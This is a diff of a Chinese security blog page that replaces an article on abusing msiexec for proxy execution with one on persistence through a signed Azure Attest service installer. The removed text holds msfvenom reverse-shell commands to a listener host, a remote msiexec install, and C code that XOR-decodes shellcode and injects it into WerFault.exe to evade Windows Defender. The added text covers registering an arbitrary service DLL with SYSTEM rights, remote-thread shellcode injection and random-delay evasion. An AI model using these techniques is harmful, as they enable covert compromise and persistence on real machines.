@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Windows Installer安装包的构建和执行, Yang Hao&#39;s blog">
+    <meta name="keywords" content="利用Azure Attest Service持久化, Yang Hao&#39;s blog">
     <meta name="description" content="Yang Hao&#39;s blog">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>Windows Installer安装包的构建和执行 | Yang Hao&#39;s blog</title>
+    <title>利用Azure Attest Service持久化 | Yang Hao&#39;s blog</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/favicon.ico">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/awesome/css/all.css">
@@ -285,12 +285,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Windows Installer安装包的构建和执行</h1>
+                    <h1 class="description center-align post-title">利用Azure Attest Service持久化</h1>
                 </div>
             </div>
         </div>
@@ -407,12 +407,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Proxy-Execution/">
-                                <span class="chip bg-color">Proxy Execution</span>
-                            </a>
-                        
-                            <a href="/tags/Msiexec/">
-                                <span class="chip bg-color">Msiexec</span>
+                            <a href="/tags/LOLBAS/">
+                                <span class="chip bg-color">LOLBAS</span>
                             </a>
                         
                     </div>
@@ -423,8 +419,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Defense-Evasion/" class="post-category">
-                                Defense Evasion
+                            <a href="/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-category">
+                                权限维持
                             </a>
                         
                     </div>
@@ -436,28 +432,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-28
+                    2022-08-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-06-02
+                    2022-08-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    10 分
                 </div>
                 
 
@@ -467,171 +463,79 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Msiexec是WIndows上从命令行执行Windows Installer上安装、修改和执行操作的方法。Msiexec存在一个Windows Installer服务以便在需要的时候进行调用，服务中将Msiexec描述为添加、修改和删除作为 Windows Installer 程序包(.msi、.msp)提供的应用程序。二进制文件为msiexec.exe，默认存在于<code>C:\Windows\System32\</code>目录下且默认存在于系统环境变量中，可通过命令行调用。<br>msiexec.exe属于系统文件，并且可用于加载恶意msi文件获得代码执行能力，所以经常也被用来进行基于系统文件白名单的代理执行。</p>
-<h2 id="0x02-MSI文件构建和执行"><a href="#0x02-MSI文件构建和执行" class="headerlink" title="0x02 MSI文件构建和执行"></a>0x02 MSI文件构建和执行</h2><p>在利用msiexec进行代理执行时，需要先构建MSI文件，在没有其他需求的情况下，可以使用metasploit快速生成msi安装包：</p>
-<pre><code>#生成msi类型的载荷
-msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=192.168.11.1 LPORT=8888 -f msi -o rev_x64_8888.msi
-#生成msi-nouac类型的载荷
-msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=192.168.11.1 LPORT=8888 -f msi-nouac -o rev_x64_8888msi-nouac.msi
-#开启监听
-handler -p windows/x64/shell/reverse_tcp -H 0.0.0.0 -P 8888</code></pre>
-<p>生成后安装方式除了在可视化界面安装，还可以通过msiexec命令行执行本地或网络上的msi安装包获得代码执行：</p>
-<pre><code>msiexec /q /i MsiexecSetup.msi
-msiexec /q /i http://192.168.11.1/MsiexecSetup.msi</code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/bdf954d699d25571d9e3862961106356.png"></p>
-<p>这里是使用msiexec命令加载msi安装包执行的简单用例，这在一些存在命令执行漏洞的位置可以发挥一定的效果。</p>
-<h3 id="0x2-1-Visual-Studio的MSI扩展"><a href="#0x2-1-Visual-Studio的MSI扩展" class="headerlink" title="0x2-1 Visual Studio的MSI扩展"></a>0x2-1 Visual Studio的MSI扩展</h3><p>上文介绍了使用Metasploit简单生成msi安装包的方式，实际利用中需要定制化载荷执行，可以通过Visual Studio扩展Microsoft Visual Studio Installer Projects来生成MSI安装包(或InstallShield、Advanced Installer等工具)。通过该扩展可以自定义设置要执行的二进制或脚本文件，这些二进制和脚本文件都可以进行定制开发嵌入到MSI安装包中，扩展安装方式比较简单，操作如下：</p>
-<p>在扩展里联机搜索: <code>Microsoft Visual Studio Installer Projects</code><br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/da9a9cb599c8d747fe7fd1505ff4be19.png"></p>
-<p>安装完成后重启VS,新建项目时搜索 Setup Project 选择项目模板：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/20e799f09417f387745299874bd0d22e.png"></p>
-<p>在MSI安装包项目中，可以设置安装程序在目标主机上执行的文件、注册表、快捷方式等操作：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/2791af7d0ee7fab11125d78b9cb432e6.png"></p>
-<p>其中主要就是利用文件系统和自定义操作选项，可以设置将在目标主机上释放的文件和执行的命令：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/040c254443619387b1ae90ba05dc2add.png"></p>
-<p>在文件系统选项中选择要添加的文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6cf9e7398d99926610f0dfbd67d4cc2d.png"></p>
-<p>自定义选项中可以设置在安装、修复、回滚、卸载阶段执行的命令：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6cf9e7398d99926610f0dfbd67d4cc2d.png"></p>
-<h4 id="0x2-1-1-MSI安装包属性设置"><a href="#0x2-1-1-MSI安装包属性设置" class="headerlink" title="0x2-1-1 MSI安装包属性设置"></a>0x2-1-1 MSI安装包属性设置</h4><p>在扩展中可以对安装包的属性进行设置，部分属性会在msi文件的详细信息中体现，所以可以对属性进行一些伪造欺骗：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/69918438f3405be97525473e65465d82.png"><br>伪造一个Apple的安装包:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/d8f3e6fc4cdb3c7a92eae9fc4453c74c.png"><br>一些开发者属性信息会自动用于应用目录的设置:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b677e0595f9177d8b38f397677127cfd.png"><br>在属性中有一个 installAllUsers 的属性，如果选择True时，在管理员权限下msiexec会使用SYSTEM权限执行安装:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/5fbc011167e57a48576a6d4848fe7c7a.png"><br>在属性中还可以设置图标(一个免费的图标获取网站：<a target="_blank" rel="noopener" href="https://icons8.com/app/windows">https://icons8.com/app/windows</a>  )：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/4a531b66566dfca8bfcbde7ec1e45e79.png"><br>图标设置后会在控制面板程序中看到：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/3d3108d8a8af9d005140201405a19daa.png"><br>其他msi安装包中的图标可以通过 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/orca-exe">Orca</a> 工具(SDK中的安装包名为Orca-x86_en-us.msi)中的<code>Tables-Export Tables</code>功能提取文件：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/3d3b0a2f3dae5e993c688f68854c90b7.png"><br>更多的属性可参考微软文档:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/msi/property-reference?redirectedfrom=MSDN">property-reference</a> ,msi安装包的属性在下文设置执行条件时还会使用。</p>
-<h4 id="0x2-1-2-MSI安装包启动条件设置"><a href="#0x2-1-2-MSI安装包启动条件设置" class="headerlink" title="0x2-1-2 MSI安装包启动条件设置"></a>0x2-1-2 MSI安装包启动条件设置</h4><p>在项目view菜单中可以设置启动条件，用于检查当前执行环境是否可以继续安装:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/bec08063adfe13976fbd10211b2d4574.png"><br>这个配置中主要使用的是<code>Launch Conditions</code>来添加执行条件，根据上文参考链接中的属性，可以设置硬件属性中的内存、分辨率来检测虚拟机:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/2fe8b9886d5c7c518553148fd3f8e042.png"><br>执行效果：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e25e0ac6acecbeec8d785130d054b868.png"><br>对于一些其他商业软件可进行的复杂条件设置，可以通过Orca查看然后学走：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/855034c386b60e601daca4c6d4a16d1e.png"><br>一些常见的条件设置可以参考<a target="_blank" rel="noopener" href="https://community.flexera.com/t5/InstallShield-Knowledge-Base/Common-MSI-Conditions/ta-p/3854">InstallShield</a>:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/7d8c151b85ee3b6dbd31c4e703e2866b.png"><br>并且在安装时可以使用<code>msiexec /q /i MsiexecSetup.msi /log 123.log</code>方式输出日志文件，通过对比日志文件进行更详细的条件设置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/8baf4e2062e0b46d8c05401ad59d125e.png"><br>并且可以注意到内存并不是标准的32GB(32768MB)数值，而是会略微较小(32588MB)，这是一个需要注意的点。如果在测试过程中安装失败，也可以在日志中看到错误代码。错误代码的详细信息可以在官方文档中查询到:<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-error-messages">windows-installer-error-messages</a></p>
-<h3 id="0x2-2-MSI中执行载荷"><a href="#0x2-2-MSI中执行载荷" class="headerlink" title="0x2-2 MSI中执行载荷"></a>0x2-2 MSI中执行载荷</h3><p>MSI安装包中可以添加exe、dll、vbs、js类型二进制文件或脚本。常用操作是通过文件系统管理添加要执行的文件，然后在自定义操作中设置在几个阶段要执行的文件。文件释放位置可以使用系统文件夹属性变量:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/51f89d859891113ca9e21696f22eb329.png"><br>在文件系统中可以新增自定义文件夹来使用不同的文件夹属性值，释放文件到Temp目录一定程度上可以规避安全软件:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b29e4c0d48f88fcc5c74af4a90485f1f.png"><br>添加完成后，在自定义操作中设置在安装阶段执行文件，选择之前添加的文件位置:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/26ae33bd55db0358115b946bb28f796e.png"><br>设置文件的执行动作时，可以在属性栏中设置EXE文件启动参数、DLL文件入口函数:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/be54650d55e0bf74170ca6353258e4d1.png"><br>DLL文件的导出函数需要使用下列方式声明:</p>
-<pre><code>extern "C" __declspec(dllexport) UINT __stdcall Install(MSIHANDLE hInstall)
+                <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p><code>AzureAttestService</code>是安装<code>SQL Server 2019</code>后存在的服务，用于远程验证平台的可信度和其中运行的二进制文件的完整性，详细说明见 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-ca/azure/attestation/overview">Microsoft Azure Attestation</a>。<code>AzureAttestService</code>存在DLL类型服务文件<code>AzureAttestService.dll</code>和服务安装程序<code>AzureAttestServiceInstaller.exe</code>，可以通过服务安装程序对服务进行安装、启动停止和卸载。服务安装程序对DLL文件的验证存在问题，其未对要安装的服务DLL进行合法性检测，可将任意服务DLL安装为系统服务，通过这种方式可以绕过安全软件防御进行权限维持。本文测试系统环境为<code>WIN10 x64 1809</code>。</p>
+<h2 id="0x02-服务程序测试"><a href="#0x02-服务程序测试" class="headerlink" title="0x02 服务程序测试"></a>0x02 服务程序测试</h2><p><code>AzureAttestServiceInstaller.exe</code> 和 <code>AzureAttestService.dll</code> 均是由微软签名的文件，其中<code>AzureAttestServiceInstaller.exe</code> 有4个参数用于服务的操作(-h):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/2309fe408fa13ed263be8312c6403426.png"><br>其中 <code>-Install &lt;path to service dll&gt;</code>参数可以将DLL注册成为<code>svchost.exe</code>托管的<code>system</code>权限系统服务:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/28a51d2ef523b0fe915b05ae9060855d.png"><br>注册完成后可以在注册表<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\AzureAttestService</code> 项目中查询到对应注册信息:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/e72f7d2d72c069b195aad4ec652ff566.png"><br><code>Parameters</code>项中可查询服务DLL路径和导出函数信息:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/020f1cfe5dc64520b15d60b4d1b2de07.png"><br>因为<code>AzureAttestServiceInstaller.exe</code>可以将DLL注册为服务，那么可以编写一个服务类型DLL交给其注册即可。在实际利用中，如果直接使用自编写的服务DLL进行安装，安全软件可能会进行弹窗提醒，此时可以通过<code>AzureAttestServiceInstaller.exe</code>命令安装服务、停止服务后替换服务DLL达到绕过目的。在实践之前需要先编写一个DLL类型的服务。</p>
+<h2 id="0x03-服务DLL编写"><a href="#0x03-服务DLL编写" class="headerlink" title="0x03 服务DLL编写"></a>0x03 服务DLL编写</h2><p>在DLL中实现服务的操作，需要具有一个导出函数并与注册表中的<br><code>ServiceMain</code>键值对应，以便<code>svchost.exe</code>执行，默认导出函数是<code>ServiceMain</code> 。查找到的代码示例有<code>MSDN</code>的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function">编写ServiceMain函数</a>和<code>IRed</code>上的<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain">Persisting in svchost.exe with a Service DLL</a>。如果要详细分析服务代码和各个参数作用可以参考《Windows核心编程》中Windows服务篇。本文仅对要编写的代码进行介绍，先需要在<code>ServiceMain</code>函数中通过<code>RegisterServiceCtrlHandler</code>注册一个回调函数来处理<code>SCM</code>的服务控制请求，如对服务的启动、停止等。因为需要通过 <code>AzureAttestServiceInstaller.exe</code> 来注册DLL服务的，所以在DLL中的<code>RegisterServiceCtrlHandler</code>函数第一个参数服务名称需要和该安装程序中默认的名称<code>AzureAttestService</code>保持一致 :<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/85f0982738ffd88bf71e2df08703b475.png"><br>在<code>dwServiceType</code>参数中设置<code>SERVICE_WIN32_SHARE_PROCESS</code>表示服务与其他服务可共享进程以便资源、环境变量等共享，一般宿主进程是<code>svchost.exe</code>。<br>接下来通过<code>ReportSvcStatus</code>向<code>SCM</code>返回服务状态，然后就进入用户处理函数<code>ExecuteServiceCode</code>。<code>IRed</code>的示例中是在<code>ExecuteServiceCode</code> 函数的合适位置执行持久化代码:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/04f8ed5853df44e07da560d024e9f499.png"><br>在这里执行执行代码时需要考虑到线程阻塞问题，如果直接使用指针方式<code>(*(void(*)())buffer)()</code>执行<code>shellcode</code>，会导致<code>SCM</code>无法正常对该服务进行控制。以下代码通过创建线程执行<code>shellcode</code>注入函数：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/7cdc30d346e654313d7d2b066dc8b12c.png"><br>注入<code>shellcode</code>时使用远程线程注入的方式进行，这样做可以让要执行的<code>shellcode</code>与当前<code>DLL</code>模块分离开，代码会在当前<code>svchost.exe</code>进程中分配空间执行:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/d6ff7a33f63fb74b0f213448cf3826b1.png"><br>编写完服务DLL代码后，以64位<code>Release</code>模式编译，得到一个服务DLL(<code>ServiceDLL.dll</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/6af66677e1210d98ef0939a686e5edac.png"><br>该DLL文件成功通过了<code>AzureAttestServiceInstaller.exe</code>的服务安装、启动、停止和卸载命令测试。为了在实际中使用该方法进行权限维持，还需对服务DLL使用必要的安全规避技术，如对<code>shellcode</code>进行编码或加密等。</p>
+<h2 id="0x04-服务DLL安全规避"><a href="#0x04-服务DLL安全规避" class="headerlink" title="0x04 服务DLL安全规避"></a>0x04 服务DLL安全规避</h2><p>在本节中会使用随机延时，<code>shellcode</code>加密，主机指纹识别这三种方法来提高服务代码的安全软件规避能力。</p>
+<h3 id="0x4-1-随机延时"><a href="#0x4-1-随机延时" class="headerlink" title="0x4-1 随机延时"></a>0x4-1 随机延时</h3><p>随机延时功能将注入<code>shellcode</code>的线程延后600~900秒执行，以争取安全软件扫描超时。在延时函数的选择上，不使用常见的<code>Sleep</code>函数进行延时，可以参考<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/synchapi/">synchapi.h</a>头文件中的<code>API</code>函数，如下通过<code>WaitForSingleObject</code>进行5秒延时:</p>
+<pre><code class="line-numbers language-c">&nbsp;HANDLE hProcess = GetCurrentProcess();
+ // wait for 5 s
+ DWORD dw = WaitForSingleObject(hProcess, 5000); </code></pre>
+<p>有了延时函数后还需要一个随机数生成函数配合进行延时，在<code>MSDN</code>上搜索到相关函数<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/cpp/c-runtime-library/reference/rand?view=msvc-170">rand</a>的示例代码，改动部分代码后可以生成一个伪随机数(种子不变时，每次生成的随机数都一样):</p>
+<pre><code class="line-numbers language-c">#include &lt;stdlib.h&gt; // rand(), srand()
+#include &lt;stdio.h&gt; // printf()
+int main(void)
 {
-&nbsp;&nbsp;&nbsp; RunYourSteps();
-&nbsp;&nbsp;&nbsp; return ERROR_SUCCESS;
+    srand(882);
+    int r = ((double)rand() / RAND_MAX) * static_cast&lt;__int64&gt;(10000 - 1000) + 1000;
+    printf("%d\n", r);
 }</code></pre>
-<p>另外需要注意的是可执行文件和msi安装包的PlatForm需要正确设置，在msi项目属性中(dll是64位的，msi对应属性也设置为64位)：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e1bdb94c2c16736e70bb87534efb70b8.png"><br>自定义操作中针对文件设置：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/6c005fa537dff7af4bf9126853f93a8b.png"><br>通过在msi安装程序中利用dll文件执行（xor还原stage payload后创建进程注入）绕过WinDefender静态扫描和动态查杀：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/60debd35e3ca934e0048a9c7d2221758.gif"></p>
-<h2 id="0x02-MSIEXEC加载DLL执行"><a href="#0x02-MSIEXEC加载DLL执行" class="headerlink" title="0x02 MSIEXEC加载DLL执行"></a>0x02 MSIEXEC加载DLL执行</h2><p>msiexec程序也可以加载DLL执行，前提是DLL文件在磁盘上存在并且是64位的。通过命令行调用DLL中的DllRegisterServer或DllUnRegisterServer导出函数:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/0d2ce0135a774994aeca7007bc2ff2e2.png"><br>命令行执行时需要注意文件路径:</p>
-<pre><code># DllUnRegisterServer
-msiexec /z C:\windows\tmp\run.dll
-# DllRegisterServer
-msiexec /y ..\..\..\windows\tmp\run.dll
-# 执行run.dll文件 DllRegisterServer
-msiexec /y ..\..\..\windows\tmp\run
-# 执行 .dll 文件 DllRegisterServer
-msiexec /y .\</code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/9dc508e543dd293e564f25c6fc3a52cd.png"></p>
-<p>测试时发现在测试环境中<code>/z</code>参数不能触发DllUnRegisterServer的执行，这可以直接在dllmain函数中进行想要的操作:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/b8b2f42b2f931c32d1185391fc47344d.png"><br>这就可以自定义DLL后通过msiexec加载了。一般WIndows会自带WinDefender安全软件，我们在Dllmain中简单判断下当前的物理内存大小，可以绕过它的模拟执行检测，简单Demo如下:</p>
-<pre><code class="line-numbers language-c">#include "pch.h"
-#include &lt;iostream&gt;
-#include &lt;tchar.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;windows.h&gt;
-#include &lt;msi.h&gt;
-#include &lt;msiquery.h&gt;
-#include &lt;sddl.h&gt;
-#pragma comment(lib, "Msi.lib")
-HMODULE g_hModule;
-BOOL Inject_Shellcode();
-BOOL SpawnProcess(char* runcmdline);
-
-BOOL PhysicalMemory() {
-    MEMORYSTATUSEX statex;
-    statex.dwLength = sizeof(statex);
-    GlobalMemoryStatusEx(&amp;statex);
-    DWORD PhysicalMem = 0;
-    BOOL rt = FALSE;
-    PhysicalMem = statex.ullTotalPhys / 1024 / 1024;
-    if (PhysicalMem &gt; 2022) {
-        rt = TRUE;
-    }
-    return rt;
-}
-
-BOOL APIENTRY DllMain(HMODULE hModule,
-    DWORD  ul_reason_for_call,
-    LPVOID lpReserved
-)
+<p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/470c4511bb5b2cc10b2040cbe9d1884e.png"><br>为了让随机数种子随机一点，通过获取当前时间的毫秒数来设置种子，获取600-900之间的随机数：</p>
+<pre><code class="line-numbers language-c">#include &lt;stdlib.h&gt; // rand(), srand()
+#include &lt;stdio.h&gt; // printf()
+int main(void)
 {
-    g_hModule = hModule;
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-    {
-        HANDLE Mutexlock = CreateMutexA(NULL, FALSE, "CreateMutexA-yanghaoi");
-        if (GetLastError() == ERROR_ALREADY_EXISTS)
-        {
-            if (Mutexlock != NULL) CloseHandle(Mutexlock);
-            Mutexlock = NULL;
-        }
-        else {
-            if (PhysicalMemory()) {
-                // MessageBox(NULL, "Hello Dllmain!", "MessageBox", MB_OK);
-                Inject_Shellcode();
-            }
-            return ERROR_SUCCESS;
-        }
-        return 0;
-    }
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-    case DLL_PROCESS_DETACH:
-        break;
-    }
-    return TRUE;
-}
-
-BOOL Inject_Shellcode()
-{
-    unsigned char hexData[927] = {
-        0xAE, 0x1A, 0x00 , // shellcode
-    };
-
-    DWORD size = sizeof(hexData);
-    unsigned char ar[sizeof(hexData)];
-    for (int i = 0; i &lt;= size - 1; i++)
-    {
-        ar[i] = hexData[i] ^ 0x52;
-    }
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    LPVOID lpMalwareBaseAddr;
-    LPVOID lpnewVictimBaseAddr;
-    HANDLE hThread;
-    BOOL bRet = FALSE;
-    DWORD dwOldProtect;
-    lpMalwareBaseAddr = ar;
-    ZeroMemory(&amp;si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&amp;pi, sizeof(pi));
-    char* Process = (char*)"C:\\Windows\\System32\\WerFault.exe";
-    if (CreateProcessA(NULL, Process, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi) == 0) { return bRet; }
-    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (lpnewVictimBaseAddr == NULL) {
-        printf("[-] VirtualAllocEx error:%d\n", GetLastError());
-        if (!TerminateProcess(pi.hProcess, 0)) {
-            printf("[-] TerminateProcess error:%d\n", GetLastError());
-        }
-        return bRet;
-    }
-    WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr, (LPVOID)lpMalwareBaseAddr, size, NULL);
-    hThread = CreateRemoteThread(pi.hProcess, 0, 0, (LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
-    WaitForSingleObject(pi.hThread, 2000);
-    if (NULL != pi.hProcess)
-    {
-        CloseHandle(pi.hProcess);
-    }
-
-    if (NULL != pi.hThread)
-    {
-        CloseHandle(pi.hThread);
-    }
-    return bRet;
-}
-
-BOOL SpawnProcess(char* runcmdline) {
-    printf("[*] runcmdline:%s\n", runcmdline);
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
-    si.wShowWindow = SW_HIDE;
-    ZeroMemory(&amp;si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&amp;pi, sizeof(pi));
-    if (!CreateProcessA(NULL, runcmdline, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi)) { return FALSE; }
-    printf("[+] ProcessId：%d \n", pi.dwProcessId);
-    printf("[+] ThreadId：%d \n", pi.dwThreadId);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    return TRUE;
+    SYSTEMTIME stLocal;
+    GetLocalTime(&amp;stLocal);
+    printf("stLocal.wMilliseconds:%d\n", stLocal.wMilliseconds);
+    srand(stLocal.wMilliseconds);
+    int r = ((double)rand() / RAND_MAX) * static_cast&lt;__int64&gt;(900 - 600) + 600;
+    printf("%d\n", r);
+    return 0;
 }</code></pre>
-<p>编译为x64的dll后，使用<code>msiexec /z .\Msiexec</code>在开启WinDefender的环境下执行:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_3/e6fb75288a5f92516d5c19daf0b1bd91.gif"></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>文章对msi安装包的制作、载荷执行、命令执行方式进行了整理和实验，并对一些容易出现问题的地方进行了说明或提出解决方案。文章实现了在msi安装包中执行自定义程序，实现了msiexec命令执行dll和安全软件检测绕过。可以进行社工msi安装包制作、白名单命令代理执行等。</p>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1218/007/">Signed Binary Proxy Execution</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec">msiexec-commands</a><br><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/property-reference?redirectedfrom=MSDN">msi-property</a><br><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec">msiexec-hacker</a></p>
+<p>发现这样实现的随机数好像都在700以下:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/3b25b494aab7a2a5e202ad38660e1ce8.png"><br>发现可以通过随机两次来获得比较随机的值:</p>
+<pre><code class="line-numbers language-c">#include &lt;windows.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt; 
+void RangedRandDemo(int range_min, int range_max, int n,int isrand,int* intWait)
+{
+    for (int i = 0; i &lt; n; i++)
+    {
+        *intWait = ((double)rand() / RAND_MAX) * (static_cast&lt;__int64&gt;(range_max) - static_cast&lt;__int64&gt;(range_min)) + range_min;
+        printf("%6d\n", *intWait);
+    }
+}
+
+int main(void)
+{
+    SYSTEMTIME stLocal;
+    GetLocalTime(&amp;stLocal);
+    printf("stLocal.wMilliseconds:%d\n", stLocal.wMilliseconds);
+    srand(stLocal.wMilliseconds);
+    int intWait = 600;
+    RangedRandDemo(600,900,2, stLocal.wMilliseconds,&amp;intWait);
+    printf("intWait:%d\n", intWait);
+}</code></pre>
+<p>现在执行结果如下，<code>intWait</code>即为我们需要等待的秒数:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2022_8/ae87f6bc872c632428f3c642811adfa5.png"><br>当<code>WaitForSingleObject</code>等待超时后即可执行操作:</p>
+<pre><code class="line-numbers language-c">DWORD dw = WaitForSingleObject(GetCurrentProcess(), intWait * 1000);
+if (WAIT_TIMEOUT == dw) {
+printf("[+] Run my code");
+}</code></pre>
